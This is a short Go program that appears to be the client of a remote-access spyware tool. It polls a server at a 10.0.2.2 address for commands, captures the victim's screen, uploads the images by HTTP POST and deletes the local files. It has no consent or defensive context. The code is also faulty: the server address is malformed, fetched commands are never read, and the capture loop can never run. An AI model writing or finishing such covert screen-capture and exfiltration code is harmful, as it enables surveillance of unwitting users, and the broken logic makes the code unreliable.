package main

import (
	"fmt"
	"image/png"
	"net/http"
	"os"
	"time"

	"github.com/vova616/screenshot"
)

var serverIp string = "http://10.0..2.2:10000"
var userInput string = ""

func ss() {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./ss.webp")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
}

func sendFile(filePath string, mediaType string) string {
	Path := filePath
	file, err := os.Open(Path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Prepare the network request targeting Machine A's IP address
	targetURL := "http://10.0.2.2:10000/upload"
	req, err := http.NewRequest("POST", targetURL, file)
	if err != nil {
		panic(err)
	}

	// Attach metadata instructions in the headers
	req.Header.Set("X-Media-Type", mediaType)
	req.Header.Set("X-File-Name", Path)

	// Dispatch the stream
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	os.Remove(Path)
	var output string = "Server Response Status: " + resp.Status
	return (output)
}

func main() {
	for true {
		http.Get(serverIp + "/get-command")
		time.Sleep(2 * time.Second)

		if userInput != "idle" {
			if userInput == "screenshot" {
				index := 0
				for index > 120 {
					ss()
					output := sendFile("./ss.webp", "image")
					fmt.Println(output)
					time.Sleep(500 * time.Millisecond)
				}
			}
		} else {
			time.Sleep(5 * time.Second)
		}
	}
}
